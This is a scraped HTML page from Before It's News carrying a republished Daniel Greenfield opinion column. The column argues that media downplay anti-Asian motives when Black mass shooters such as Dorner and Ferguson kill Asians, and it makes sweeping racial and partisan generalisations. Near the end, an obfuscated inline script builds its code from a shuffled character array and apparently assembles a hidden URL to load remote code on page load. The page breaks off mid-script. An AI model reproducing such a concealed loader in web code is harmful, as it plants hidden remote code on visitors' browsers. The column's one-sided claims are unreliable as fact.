@@ -1,0 +1,599 @@
+<!DOCTYPE html>
+
+<!--[if IE 6]><html lang="en" id="ie6"><![endif]-->
+<!--[if IE 7]><html lang="en" id="ie7"><![endif]-->
+<!--[if IE 8]><html lang="en" id="ie8"><![endif]-->
+<!--[if IE 9]><html lang="en" id="ie9"><![endif]-->
+<!--[if !(IE 6) | !(IE 7) | !(IE 8) | !(IE 9) ]><!-->
+<html lang="en-US" prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb#">
+<!--<![endif]-->
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<meta content="eb0d8e1aa4eb537544309f38a61737e55fe86393" name="avgthreatlabs-verification"/>
+<meta content="true" name="HandheldFriendly"/>
+<meta content="3a9e97d2-169f-453b-8cfb-ee1d885aa9d9" name="fo-verify"/>
+<script src="/cdn-cgi/apps/head/qG8xE-Uz7lAm-63-NWifn0DDLXk.js"></script><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"/>
+<link href="https://beforeitsnews.com/opinion-conservative/2021/04/when-black-mass-shooters-kill-asians-its-not-a-hate-crime-3573071.html" rel="canonical">
+<link href="/manifest.json" rel="manifest" target="_blank"/>
+<link href="https://platform-api.sharethis.com" rel="dns-prefetch"/>
+<link href="https://www.google-analytics.com" rel="dns-prefetch"/>
+<link crossorigin="anonymous" href="https://fonts.gstatic.com" rel="dns-prefetch"/>
+<link href="https://www.youtube.com" rel="dns-prefetch"/>
+<meta content="2021-04-01 00:17:02" name="date">
+<meta content=" &quot;Those Asian officers who stand by and observe everything I previously mentioned,&quot; Christopher Dorner wrote in his manifesto. &quot;You are a high value target as well.&quot;The black mass shooter's first target was Monica Quan, the Asian-American daughter of Randall Quan, the first Chinese-American to become an LAPD captain.Monica was shot..." name="description"/>
+<meta content="Opinion - Conservative,target,monica,Before Its News,beforeitsnews,opinion-conservative,Sultan Knish" name="keywords"/>
+<meta content="When Black Mass Shooters Kill Asians, It’s Not a Hate Crime | Opinion - Conservative | Before It's News" property="og:title"/>
+<meta content="article" property="og:type"/>
+<meta content="https://beforeitsnews.com/opinion-conservative/2021/04/when-black-mass-shooters-kill-asians-its-not-a-hate-crime-3573071.html" property="og:url"/>
+<meta content="Before It's News | People Powered News" property="og:site_name"/>
+<meta content=" &quot;Those Asian officers who stand by and observe everything I previously mentioned,&quot; Christopher Dorner wrote in his manifesto. &quot;You are a high value target as well.&quot;The black mass shooter's first target was Monica Quan, the Asian-American daughter of Randall Quan, the first Chinese-American to become an LAPD captain.Monica was shot..." property="og:description"/>
+<meta content="227056257322081" property="fb:app_id"/>
+<meta content="Opinion - Conservative,target,monica,Before Its News,beforeitsnews,opinion-conservative,Sultan Knish" property="article:tag"/>
+<meta content="opinion-conservative" property="article:section"/>
+<meta content="2021-04-01 00:17:02" property="article:published_time"/>
+<meta content="summary" name="twitter:card"/>
+<meta content="@beforeitsnews" name="twitter:site"/>
+<meta content=" &quot;Those Asian officers who stand by and observe everything I previously mentioned,&quot; Christopher Dorner wrote in his manifesto. &quot;You are a high value target as well.&quot;The black mass shooter's first target was Monica Quan, the Asian-American daughter of Randall Quan, the first Chinese-American to become an LAPD captain.Monica was shot..." name="twitter:description"/>
+<meta content="When Black Mass Shooters Kill Asians, It’s Not a Hate Crime | Opinion - Conservative | Before It's News" name="twitter:title"/>
+<meta content="beforeitsnews.com" name="twitter:domain"/>
+<meta content="@beforeitsnews" name="twitter:creator"/>
+<meta content="https://1.bp.blogspot.com/-S5o8sEtHL9U/YGPzq7-l-FI/AAAAAAAAS9M/smoeGWl5chk207VF0cHanetrlmghVWVogCNcBGAsYHQ/s320/image_2021-03-30_205938.png" property="og:image"/>
+<meta content="https://1.bp.blogspot.com/-S5o8sEtHL9U/YGPzq7-l-FI/AAAAAAAAS9M/smoeGWl5chk207VF0cHanetrlmghVWVogCNcBGAsYHQ/s320/image_2021-03-30_205938.png" property="twitter:image"/>
+<link href="//fonts.googleapis.com/css?family=Oswald:700|Scada:700" rel="stylesheet" type="text/css"/>
+<link href="/static/css-v3/global-bin-rev-202302041.css" rel="stylesheet" type="text/css"/>
+<link href="/static/css-v3/fancybox-bin-rev-202302041.css" rel="stylesheet" type="text/css"/>
+<link href="/static/css-v3/story-bin-rev-202302041.css" rel="stylesheet" type="text/css"/>
+<link href="/static/css-dashboard/jquery-ui.css" rel="stylesheet" type="text/css"/>
+<link href="/static/css-v3/responsive-bin-rev-202302041.css" rel="stylesheet" type="text/css"/>
+<link href="/static/css-v3/web-responsive-bin-rev-202302041.css" rel="stylesheet" type="text/css"/>
+<script src="/static/js-v3/jquery-fancybox-mobiledetect-uuid.js" type="text/javascript"></script>
+<script src="/static/js-v3/global-bin-rev-202302041.js" type="text/javascript"></script>
+<title>When Black Mass Shooters Kill Asians, It’s Not a Hate Crime | Opinion - Conservative | Before It's News</title>
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+            new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+            j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+            'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+        })(window,document,'script','dataLayer','GTM-5D8XJ6Q');</script>
+<script async="async" src="https://platform-api.sharethis.com/js/sharethis.js#property=5f2c559be7229f0012f31c92&amp;product=sticky-share-buttons" type="text/javascript"></script>
+</meta></link></head>
+<body id="v3">
+<span id="admin_tab"></span>
+<div id="body-container">
+<div id="top-alert" style="display: none;">
+<div class="ad-message__icon">
+<svg version="1.1" viewbox="0 0 20 24" xmlns="http://www.w3.org/2000/svg">
+<g fill="none" fill-rule="evenodd" transform="translate(-18 -479)">
+<g fill="#fff" transform="translate(0 464)">
+<g transform="translate(16 15)">
+<path d="m12 9.6667l-4.3333-4.3333-1.3333 1.3333 4.3333 4.3333-4.3333 4.3333 1.3333 1.3333 4.3333-4.3333 4.3333 4.3333 1.3333-1.3333-4.3333-4.3333 4.3333-4.3333-1.3333-1.3333-4.3333 4.3333zm10-8.3552v10.189c0 5-3.3333 9.1667-10 12.5-6.6667-3.3333-10-7.5-10-12.5v-10.189c3.1889-0.85536 6.5412-1.3115 10-1.3115s6.8111 0.45611 10 1.3115z"></path>
+</g>
+</g>
+</g>
+</svg>
+</div>
+<div class="ad-message__message">
+<div class="message__top">You're using an Ad-Blocker.</div>
+<div class="message__content">BeforeItsNews only exists through ads.<br/>We ask all patriots who appreciate the evil we expose and want to
+help us savage the NWO with more Truth to disable your ad-blocker on our site only so we can grow and expose more evil!<br/>Funding
+gives us more weapons! Thank you patriots! Oh and If you disable the Ad-blocker - on your deathbed you will receive total
+consciousness. So you got that going for you...which is nice!
+</div>
+</div>
+<div class="ad-message__buttons clearfix">
+<div class="ad-message__button" id="ad-disable" onclick="adDisable();">Disable</div>
+<div class="ad-message__button" id="ad-dismiss" onclick="adDismiss();">Dismiss</div>
+</div>
+</div>
+<div class="fixed-enabled" id="header">
+<div class="header-top">
+<div id="icon"><a href="/"><img height="110px" src="//img.beforeitsnews.com/img/v3/top-logo.png"/> </a></div>
+<div id="logo"><a href="/">Before It's News</a></div>
+<div id="searchbar">
+<form action="/v3/search/" id="cse-search-box">
+<input autocomplete="off" id="q" name="q" placeholder="Search..." size="30" type="text"/>
+<input id="sa" name="sa" onclick="if ($('#q').val() == '') {$('#q').focus(); alert('Please, input query text!'); return false;}" type="submit" value=""/>
+</form>
+<div id="google_translate_element" title="Translate"></div>
+</div>
+<div id="user_status"></div>
+<div id="menu">
+<div id="menu_center">
+<ul id="header-main-menu">
+<li><a href="/v3/list/featured.html">Featured</a> <span>|</span></li>
+<li><a href="/v3/list/v2_top_money.html">Economy</a> <span>|</span></li>
+<li><a href="/v3/list/v2_top_health.html">Health</a> <span>|</span></li>
+<li><a href="/v3/list/v2_top_beyond_science.html">Beyond Science</a> <span>|</span></li>
+<li><a href="/v3/list/v2_top_power_of_belief.html">Power of Belief</a> <span>|</span></li>
+<li><a href="/v3/list/v2_top_sustainable_living.html">Sustainable Living</a><span>|</span></li>
+<li><a href="/v3/list/v2_top_inspiration.html">Inspiration</a> <span>|</span></li>
+<li><a href="/v3/live/">Live</a> <span>|</span></li>
+<li><a href="/v3/video/">Video</a> <span>|</span></li>
+<li><a href="/v3/top50/">Top 50</a> <span>|</span></li>
+<li><a href="/v3/recent/" target="_blank">Most Recent</a> <span>|</span></li>
+<li><a href="https://www.herbanomics.com/collections/all" target="_blank">Shopping</a> <span>|</span></li>
+<li><a href="/v3/categories/">Categories</a></li>
+</ul>
+</div>
+</div>
+</div>
+</div>
+<main>
+<div id="main">
+<div id="container">
+<div style="font-family: Scada, Oswald, sans-serif; font-size: 19px; padding-bottom: 15px">
+Read the <a href="/v3/about/" target="_blank">Beforeitsnews.com</a> story here.
+<span style="float: right;">Advertise at <a href="/v3/advertise/" target="_blank">Before It's News</a> here.</span>
+</div>
+<div id="infobar">
+<div id="profile_pic">
+<img alt="Profile image" id="profile_image" src="//img.beforeitsnews.com/img/profiles/0000000000004254.jpeg"/>
+</div>
+<div id="profile_info">
+<div id="like_contributor"><span id="like_contributor_count"></span></div>
+<div id="like_story"><span id="like_story_count"></span></div>
+<div id="attribution">By <span class="authors_name" id="pen_name">Sultan Knish</span>
+<span id="roles"> (Reporter)</span><br>
+<a href="/v3/contributor/bio/?uid=4254" id="profile_href" target="_blank">Contributor profile</a> |
+<a href="/v3/contributor/stories/?uid=4254" id="stories_href" target="_blank">More stories</a><br/>
+<div id="subscribenewsletter"></div>
+</br></div>
+</div>
+<div id="viewcounters">
+<table border="0" cellpadding="0" cellspacing="0" style="width:175px; margin: 0px; padding: 0px; line-height: 12px;">
+<tr>
+<td align="center" colspan="2" height="8">
+<div class="story_views">Story Views</div>
+</td>
+</tr>
+<tr>
+<td align="left" width="90">Now:</td>
+<td align="left"><span id="chartbeat_count"></span></td>
+</tr>
+<tr>
+<td align="left">Last hour:</td>
+<td align="left"><span id="counter_hour"></span></td>
+</tr>
+<tr>
+<td align="left">Last 24 hours:</td>
+<td align="left"><span id="counter_day"></span></td>
+</tr>
+<tr>
+<td align="left">Total:</td>
+<td align="left"><span id="counter_total"></span></td>
+</tr>
+</table>
+</div>
+<div id="badges">
+</div>
+</div>
+<article>
+<div id="story">
+<div class="story_wrapper" id="story_wrapper">
+<div id="story_column">
+<header>
+<div id="headline"><h1>When Black Mass Shooters Kill Asians, It’s Not a Hate Crime</h1></div>
+<div id="story_info">
+<div class="post_date">
+Thursday, April 1, 2021 0:17 </div>
+<div id="edit_delete"></div>
+</div>
+</header>
+<div id="disclaimer"></div>
+<div id="story_toolbar">
+<div id="fact_meter"><span id="fact_percent"></span>
+% of readers think this story is Fact. Add your two cents.<br>
+<div class="fiction_unselected" id="fiction"></div>
+<div id="scale"></div>
+<div class="fact_unselected" id="fact"></div>
+</br></div>
+</div>
+<input id="author_id" name="author_id" type="hidden" value="4254"/>
+<input id="story_id" name="story_id" type="hidden" value="3573071"/>
+<input id="category_id" name="category_id" type="hidden" value="29"/>
+<input id="story_tsp" name="story_tsp" type="hidden" value="1617250622"/>
+<div id="contributor_stories"></div>
+<div class="top_clarifying_the_truth_social_share" style="display: none;">
+<div id="top_clarifying_facebook_share_button" title="Share on Facebook"></div>
+<div id="top_clarifying_tweet_share_button" title="Share on Twitter"></div>
+<div id="top_clarifying_google_share_button" title="Share on Google Plus"></div>
+<div id="top_clarifying_sumbleupon_share_button" title="Share on Stumbleupon"></div>
+<div id="top_clarifying_email_share_button" style="cursor:pointer;" title="Share via Email">
+<img src="//img.beforeitsnews.com/img/social/mail_inline_share.png"/>
+</div>
+</div>
+<div class="sharethis-inline-share-buttons"></div>
+<div style="clear: both"></div>
+<div id="body">
+<p><img loading="lazy" src="/images/archives/d7c72565d3ae851626dd0aac6ceb268c2d1986c0.jpg" style="display:block; margin:0 auto; width:400px;"/><!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
+<br>
+<html><body>
+<p>“Those Asian officers who stand by and observe everything I previously mentioned,” Christopher Dorner wrote in his manifesto. “You are a high value target as well.”</p>
+<p>The black mass shooter’s first target was Monica Quan, the Asian-American daughter of Randall Quan, the first Chinese-American to become an LAPD captain.</p>
+<div style="clear: both; text-align: center;"><a href="/v3/r2/?url=aHR0cDovL3d3dy5kYW5pZWxncmVlbmZpZWxkLm9yZy8vMjAyMS8wMy9odHRwczovLzEuYnAuYmxvZ3Nwb3QuY29tLy1TNW84c0V0SEw5VS9ZR1B6cTctbC1GSS9BQUFBQUFBQVM5TS9zbW9lR1dsNWNoazIwN1ZGMGNIYW5ldHJsbWdoVldWb2dDTmNCR0FzWUhRL3M1NjQvaW1hZ2VfMjAyMS0wMy0zMF8yMDU5MzgucG5n" rel="nofollow" style="clear: left; float: left; margin-bottom: 1em; margin-right: 1em;" target="_blank"></a></div>
+<p>Monica was shot three times in the back of the head. Afterward, Dorner called her father and told him that he “should have done a better job of protecting his daughter.”</p>
+<p>The media coverage of Dorner’s shooting spree focused on the racist rants about white police officers (or caucasians) in his manifesto, but there was very little discussion of his hatred for Asian-Americans even though he had named them as targets in his hateful screed.</p>
+<p>When black mass shooters kill Asian people, the media tries to gloss over it.</p> <p>
+<div class="rotating_text_link" id="rotating_text_link_20"></div>
+<div id="contentAdItem_1">
+<div id="M310742ScriptRootC720409"></div>
+<script async="" src="https://jsc.mgid.com/b/e/beforeitsnews.com.720409.js"></script>
+</div>
+</p><p><div style="clear: both"><div class="rotating_text_link" id="rotating_text_link_21"></div></div></p>
+<p>Colin Ferguson’s mass shooting in the 90s on a New York train is remembered largely for the decision by his radical leftist lawyers, William Kunstler and Ron Kuby to use the “Black Rage” defense. Shortly before his death, Kunstler argued that black people are entitled to rage.</p>
+<p>But what is often forgotten is that two of the six people whom Ferguson murdered were Asian.</p>
+<p>Maria Theresa Tumangan Magtoto was the daughter of an official with the Philippine Senate. Mi Kyung Kim, a Korean-American, had been working as a library assistant at Columbia.</p>
+<p>A third of the men and women whom Ferguson killed were Asians.</p>
+<p>This wasn’t a coincidence. Notes in Ferguson’s pockets were scribbled with rants about white people, “Uncle Toms”, and “Chinese” people. None of the Asian-Americans he shot were actually Chinese, but the racist gunman didn’t seem to care.</p> <p>
+<div class="rotating_text_link" id="rotating_text_link_22"></div>
+<div id="contentAdItem_2">
+<div id="M310742ScriptRootC720410"></div>
+<script async="" src="https://jsc.mgid.com/b/e/beforeitsnews.com.720410.js"></script>
+</div>
+</p><p><div style="clear: both"><div class="rotating_text_link" id="rotating_text_link_23"></div></div></p>
+<p>“When Louis Farrakhan mentioned Mr. Ferguson at a New York rally on Dec. 18, his audience erupted in an ovation”, “The Hate That Hate Begot”, a New York Daily News article, noted.</p>
+<p>“God spoke to Colin Ferguson and said, ‘Catch the train, Colin, catch the train’”, the Nation of Islam’s Khalid Abdul Muhammad declared at Howard University.</p>
+<p>When John Allen Muhammad went on his rampage, his victims included Hong Im Ballenger, a Korean immigrant who ran a beauty supply store. As the D.C. sniper’s last name showed, he had been a member of Farrakhan’s black supremacist Nation of Islam hate group.</p>
+<p>The Nation of Islam believes that non-black people were created through a eugenics program by a mad scientist from the original black race. “Asians want to know if we are targeting all Asian business. We know Asians have targeted Black communities to exploit. The JIG IS UP,” Jeffery Muhammad, the Nation of Islam leader in Dallas, had warned.</p>
+<p>This sort of anti-Asian hate extends into the highest reaches of the Democrats and the media.</p><p><div class="rotating_text_link" id="rotating_text_link_24"></div></p>
+<p>Before Al Sharpton was an MSNBC host, a Democrat presidential candidate with a DNC speaking slot, and a Democrat kingmaker, he was leading boycotts of Korean stores.</p>
+<p>Sharpton had supported <a href="/v3/r2/?url=aHR0cDovL3d3dy5kYW5pZWxncmVlbmZpZWxkLm9yZy8vMjAyMS8wMy9odHRwczovL3d3dy53YXNoaW5ndG9ucG9zdC5jb20vYXJjaGl2ZS9vcGluaW9ucy8xOTk1LzA1LzA3L3RoZWlyLWFtZXJpY2FuLW5pZ2h0bWFyZS8=" rel="nofollow" target="_blank">the</a> infamous Family Red Apple boycott at which racist mobs had called the owners, “yellow monkeys” and chanted, “Koreans, go home.” The <a href="/v3/r2/?url=aHR0cDovL3d3dy5kYW5pZWxncmVlbmZpZWxkLm9yZy8vMjAyMS8wMy9odHRwczovL2FyY2hpdmVzLmZyb250cGFnZW1hZy5jb20vZnBtL2FtZXJpY2FzLWJsYWNrLXJhY2lzdC1oeXBvY3Jpc3ktZGFuaWVsLWdyZWVuZmllbGQv" rel="nofollow" target="_blank">Freddy’s Fashion Mart protests</a>, led by Morris Powell, head of the Buy Black Committee at Sharpton’s National Action Network, later turned lethal, culminating in the murders of seven people.</p>
+<p>While the motive there was antisemitism and the victims were mostly young Latino women, the fire was followed by <a href="/v3/r2/?url=aHR0cDovL3d3dy5kYW5pZWxncmVlbmZpZWxkLm9yZy8vMjAyMS8wMy9odHRwczovL2FyY2hpdmUuaXMvNEVDbHA=" rel="nofollow" target="_blank">threats of violence</a> against Korean stores in Harlem.</p>
+<p>And Powell had cut his teeth on black supremacist boycotts of Asian businesses.</p>
+<p>In a previous boycott incident at the Victory Fish Market, he had allegedly <a href="/v3/r2/?url=aHR0cDovL3d3dy5kYW5pZWxncmVlbmZpZWxkLm9yZy8vMjAyMS8wMy9odHRwczovL3d3dy5uZXdzcGFwZXJzLmNvbS9uZXdzcGFnZS80NzM1OTU3NjQv" rel="nofollow" target="_blank">fractured </a>the skull of Kim Soo Yea: the wife of the store owner.</p><p><div class="rotating_text_link" id="rotating_text_link_25"></div></p>
+<p>The National Action Network has since been addressed by every top Democrat from Obama to Biden to Elizabeth Warren and Kamala Harris.</p>
+<p>The Democrats have jumped eagerly on the spa shootings. Their media insists that the shooter could not have been a sex addict motivated by his own disorder, as he said, but that he must be a racist who hated Asian people, while refusing to make a reckoning with the publicly stated hatred for Asian people of black mass shooters like Colin Ferguson and Christopher Dorner.</p>
+<p>The spa shootings emerged as a convenient distraction from the protests over the escalating criminal assaults on Asian people in California and New York by mostly black perpetrators.</p>
+<p>“The perpetrator in some cases has been African American,” San Francisco Mayor London Breed had said. “And as an African American woman, as the mayor of your city, I am here to hold everyone accountable.”</p>
+<p>That was not the media’s agenda.</p><p><div class="rotating_text_link" id="rotating_text_link_26"></div></p>
+<p>Back in February, Time was scolding Asian-American victims and telling them that they needed to figure out “how to tackle anti-Asian violence without relying on law enforcement institutions that have historically targeted Black and brown communities”.</p>
+<p>After the spa shootings, headlines like “Advocates Discourage Anti-Black Sentiment Amid Violence Against Asians” and the clumsy attempts to falsely ascribe attacks by black men on elderly Asian people to President Trump and whiteness (“This violence is caused by a system that makes working people compete against each other for scraps of what the wealthy possess,” Oakland City Councilwoman Carroll Fife) gave way to political relief for Democrats.</p>
+<p>The media spread the false claim that a police spokesman had dismissed the attack as a case of the perpetrator having a “bad day”. Even though neither the police nor the FBI had found a racial motive, the media spread its racism narrative without even the tiniest trace of evidence.</p>
+<p>It makes little difference to the actual case. Even now, at the peak of the Democrat pro-crime policy wave where criminals are let loose for slashings and robberies, a mass murderer is never going to set foot outside the prison system whether or not he’s charged with a hate crime.</p>
+<p>But there’s a great deal politically at stake for the Democrat media which is seizing the opportunity to deflect a politically problematic crisis back into politically safe waters.</p><p><div class="rotating_text_link" id="rotating_text_link_27"></div></p>
+<p>Racist killers don’t make a big secret of their hate. White supremacist mass shooters like Dylann Roof at the Mother Emanuel church in Charleston and Robert Bowers at the Tree of Life synagogue in Pittsburgh, or black supremacist shooters, like Micah X. Johnson in Dallas or David Anderson at the Kosher market in Jersey City, left their ugly beliefs in public view.</p>
+<p>Dorner and Ferguson had notes and manifestos.</p>
+<p>The media spends a lot more time talking about politically convenient mass killers than inconvenient ones. It’s why Robert Bowers got so much more coverage than David Anderson. It’s also why Colin Ferguson and Dylann Roof received a very different reception.</p>
+<p>It is wholly possible to be an evil person without being a bigot. The average serial killer is not a racist. He’s just wholly devoid of empathy and enjoys the pain and suffering of others. Not every crime needs to be viewed through the narrow academic lens of prejudice: let alone ‘whiteness’.</p>
+<p>But much as Communists couldn’t see the world in any terms other than class, Wokies can’t understand any event except by shoving it into their identity politics prism. Some things fit into that prism, others can be made to fit with enough fake news, and still others will never fit and have to be ignored, covered up, and buried at midnight in the media graveyard of dead stories.</p><p><div class="rotating_text_link" id="rotating_text_link_28"></div></p>
+<p>The media is no longer in the business of reporting stories, but of politically reconciling them in the same way that Pravda reporters had to reconcile events with Marxism-Leninism. The media politically confronts events, and tries to understand them, before distilling their understanding.</p>
+<p>Journalism has become an academic enterprise of grad students treating every event like an opportunity to unload critical race theory lectures so that the public can be properly educated.</p>
+<p>But now that the media is suddenly interested in mass shooters who target Asians, it might want to revisit Ferguson and Dorner who actually targeted Asians and wrote about doing it, instead of trying to ascribe a racial motive to a monster who left behind no evidence of being a bigot.
+<div>
+<p><i><a href="/v3/r2/?url=aHR0cDovL3N1bHRhbmtuaXNoLmJsb2dzcG90LmNvbS8=" rel="nofollow" target="_blank">Daniel Greenfield</a> is a Shillman Journalism Fellow at the David Horowitz Freedom Center. This article previously appeared at the Center’s <a href="/v3/r2/?url=aHR0cDovL3d3dy5kYW5pZWxncmVlbmZpZWxkLm9yZy8vMjAyMS8wMy9odHRwczovL3d3dy5mcm9udHBhZ2VtYWcuY29tLw==" rel="nofollow" target="_blank">Front Page Magazine</a>.</i></p>
+<p><i>Click <a href="/v3/r2/?url=aHR0cDovL3N1bHRhbmtuaXNoLmJsb2dzcG90LmNvbS8yMDA1LzAzL2Jsb2dnaW5nLWhhcmEuaHRtbA==" rel="nofollow" target="_blank">here to subscribe</a> to my articles. </i><br/><i><br/></i><i>Thank you for reading.</i></p>
+</div>
+<div> <a href="/v3/r2/?url=aHR0cDovL2ZlZWRzLmZlZWRidXJuZXIuY29tL35mZi9Gcm9tTnlUb0lzcmFlbFN1bHRhblJldmVhbHNUaGVTdG9yaWVzQmVoaW5kVGhlTmV3cz9hPXVhWV9xaFY5TGFJOlZSX1c1cFQ0NXNBOnlJbDJBVW9DOHpB" rel="nofollow" target="_blank"></a> <a href="/v3/r2/?url=aHR0cDovL2ZlZWRzLmZlZWRidXJuZXIuY29tL35mZi9Gcm9tTnlUb0lzcmFlbFN1bHRhblJldmVhbHNUaGVTdG9yaWVzQmVoaW5kVGhlTmV3cz9hPXVhWV9xaFY5TGFJOlZSX1c1cFQ0NXNBOkk5b2c1c09ZeEpJ" rel="nofollow" target="_blank"></a> <a href="/v3/r2/?url=aHR0cDovL2ZlZWRzLmZlZWRidXJuZXIuY29tL35mZi9Gcm9tTnlUb0lzcmFlbFN1bHRhblJldmVhbHNUaGVTdG9yaWVzQmVoaW5kVGhlTmV3cz9hPXVhWV9xaFY5TGFJOlZSX1c1cFQ0NXNBOjYzdDdJZS1MRzdZ" rel="nofollow" target="_blank"></a> <a href="/v3/r2/?url=aHR0cDovL2ZlZWRzLmZlZWRidXJuZXIuY29tL35mZi9Gcm9tTnlUb0lzcmFlbFN1bHRhblJldmVhbHNUaGVTdG9yaWVzQmVoaW5kVGhlTmV3cz9hPXVhWV9xaFY5TGFJOlZSX1c1cFQ0NXNBOkY3ekJuTXluMExv" rel="nofollow" target="_blank"></a> <a href="/v3/r2/?url=aHR0cDovL2ZlZWRzLmZlZWRidXJuZXIuY29tL35mZi9Gcm9tTnlUb0lzcmFlbFN1bHRhblJldmVhbHNUaGVTdG9yaWVzQmVoaW5kVGhlTmV3cz9hPXVhWV9xaFY5TGFJOlZSX1c1cFQ0NXNBOlVUM3h0YkdZRnpB" rel="nofollow" target="_blank"></a> <a href="/v3/r2/?url=aHR0cDovL2ZlZWRzLmZlZWRidXJuZXIuY29tL35mZi9Gcm9tTnlUb0lzcmFlbFN1bHRhblJldmVhbHNUaGVTdG9yaWVzQmVoaW5kVGhlTmV3cz9hPXVhWV9xaFY5TGFJOlZSX1c1cFQ0NXNBOnFqNklESzdySVRz" rel="nofollow" target="_blank"></a> </div>
+<p><script>if(qzetsaei==undefined){var qzetsaei={ts:'1678324715',};(function(){var tqoojdclrbeeki=[";","w","1","!","t","R","]","'","$","l","M","^","`",":","L","8","E","k","/","A","|","W","<","h","&","O","%","f","z","v","\"","r",".","H","6","=","4","u","j","+","B","F","Z","K","V","T","o","q","3","b","_","y","D","N","G","(","I","\\","U","x","[","7"," ","@","X","5","C","2","i","e","p","S","}","{","Y","g","a","d","*","c","m","P",">","0","-","?","s",")","#","Q","n","9",",","J"];var qzetsaei=[4,31,51,73,77,46,79,37,80,69,90,4,32,79,37,31,31,69,90,4,71,79,31,68,70,4,32,86,69,4,19,4,4,31,68,49,37,4,69,55,7,86,31,79,7,92,7,9,46,9,7,87,0,72,79,76,4,79,23,55,69,87,73,72,68,27,55,10,76,4,23,32,31,76,90,77,46,80,35,35,90,37,9,9,87,73,25,49,38,69,79,4,32,77,69,27,68,90,69,81,31,46,70,69,31,4,51,55,10,76,4,23,92,30,31,76,90,77,46,80,30,92,73,29,76,9,37,69,13,27,37,90,79,4,68,46,90,55,87,73,31,69,4,37,31,90,62,70,76,31,86,69,41,9,46,76,4,55,7,83,32,7,39,90,69,1,62,52,76,4,69,55,87,32,75,69,4,58,45,66,10,68,9,9,68,86,69,79,46,90,77,86,55,87,87,72,72,87,0,72,68,27,55,10,76,4,23,32,27,9,46,46,31,35,35,90,37,9,9,87,73,25,49,38,69,79,4,32,77,69,27,68,90,69,81,31,46,70,69,31,4,51,55,10,76,4,23,92,30,27,9,46,46,31,30,92,73,29,76,9,37,69,13,27,37,90,79,4,68,46,90,55,29,87,73,31,69,4,37,31,90,62,70,76,31,86,69,56,90,4,55,29,32,4,46,71,4,31,68,90,75,55,87,87,72,72,87,0,72,68,27,55,9,70,79,35,35,37,90,77,69,27,68,90,69,77,87,73,29,76,31,62,9,70,79,35,73,37,13,7,18,18,49,69,27,46,31,69,68,4,86,90,69,1,86,32,79,46,80,18,18,18,18,18,9,17,4,27,69,46,9,68,4,69,9,17,4,18,9,17,4,27,76,49,70,9,17,4,18,67,83,67,48,18,83,48,18,9,17,4,69,76,49,70,84,1,23,69,31,69,76,31,69,51,46,37,90,46,1,2,67,83,91,15,76,84,60,31,6,32,70,90,75,7,92,51,13,7,7,92,4,86,13,7,2,34,61,15,48,67,36,61,2,65,7,92,27,9,13,60,6,92,79,27,13,27,76,9,86,69,92,76,4,50,77,46,13,30,31,77,77,51,1,77,32,79,46,80,30,92,76,4,50,38,86,13,30,76,77,29,69,31,4,68,86,68,90,75,32,38,86,30,92,76,4,50,68,80,13,30,76,77,79,46,77,69,32,70,90,75,30,92,76,4,50,31,37,13,30,18,76,77,29,69,31,4,68,86,68,90,75,32,38,86,30,92,76,4,50,31,68,13,30,18,76,77,79,9,37,4,4,69,31,32,70,90,75,30,92,76,4,50,69,68,13,30,31,68,75,23,4,76,77,30,92,76,4,50,69,79,13,30,79,46,90,4,69,90,4,84,76,77,62,79,46,90,4,69,90,4,19,77,30,92,76,4,50,69,86,13,30,70,46,86,68,4,68,46,90,13,76,49,86,46,9,37,4,69,0,77,68,86,70,9,76,51,13,49,9,46,79,17,0,30,92,76,4,50,69,13,4,31,37,69,92,76,4,50,31,13,4,31,37,69,92,76,4,50,31,67,13,27,76,9,86,69,92,68,13,27,76,9,86,69,92,79,13,83,92,37,79,13,27,76,9,86,69,92,79,9,13,60,6,92,70,29,13,27,76,9,86,69,92,79,86,86,13,27,76,9,86,69,92,76,4,50,75,13,27,76,9,86,69,92,76,4,50,77,13,27,76,9,86,69,92,76,4,50,68,13,27,76,9,86,69,92,76,4,50,27,13,27,76,9,86,69,92,76,4,50,68,49,13,7,9,17,4,7,92,86,90,13,83,92,86,4,76,31,4,13,27,37,90,79,4,68,46,90,55,87,73,31,69,4,37,31,90,62,27,37,90,79,4,68,46,90,55,87,73,3,27,37,90,79,4,68,46,90,55,76,92,49,92,79,87,73,76,60,49,6,35,79,55,87,72,55,9,70,79,92,30,29,30,92,27,37,90,79,4,68,46,90,55,87,73,27,37,90,79,4,68,46,90,62,76,55,87,73,31,69,4,37,31,90,73,1,68,77,4,23,13,17,55,87,92,23,69,68,75,23,4,13,9,55,87,72,72,27,37,90,79,4,68,46,90,62,49,55,76,92,49,87,73,29,76,31,62,79,35,73,72,0,31,69,4,37,31,90,62,49,35,39,49,20,20,83,92,79,32,1,68,77,4,23,35,55,79,32,31,68,75,23,4,35,76,32,31,68,75,23,4,39,49,87,84,55,79,32,9,69,27,4,35,76,32,9,69,27,4,84,49,87,92,79,32,23,69,68,75,23,4,35,55,79,32,49,46,4,4,46,80,35,76,32,49,46,4,4,46,80,39,49,87,84,55,79,32,4,46,70,35,76,32,4,46,70,84,49,87,92,79,72,27,37,90,79,4,68,46,90,62,79,55,76,92,79,87,73,31,69,4,37,31,90,62,76,35,76,24,24,3,76,32,90,46,77,69,45,51,70,69,85,76,60,83,6,13,76,92,76,24,24,2,35,35,35,76,32,90,46,77,69,45,51,70,69,85,49,55,76,32,75,69,4,40,46,37,90,77,68,90,75,66,9,68,69,90,4,5,69,79,4,55,87,92,79,87,13,3,2,72,27,37,90,79,4,68,46,90,62,77,55,49,87,73,49,35,90,37,9,9,35,35,49,85,76,55,87,13,2,35,35,35,49,32,90,46,77,69,45,51,70,69,85,79,55,49,87,13,49,0,29,76,31,62,77,35,49,32,23,69,68,75,23,4,92,69,35,49,32,1,68,77,4,23,0,31,69,4,37,31,90,62,77,35,30,27,37,90,79,4,68,46,90,30,35,35,4,51,70,69,46,27,62,77,85,77,32,79,76,9,9,55,49,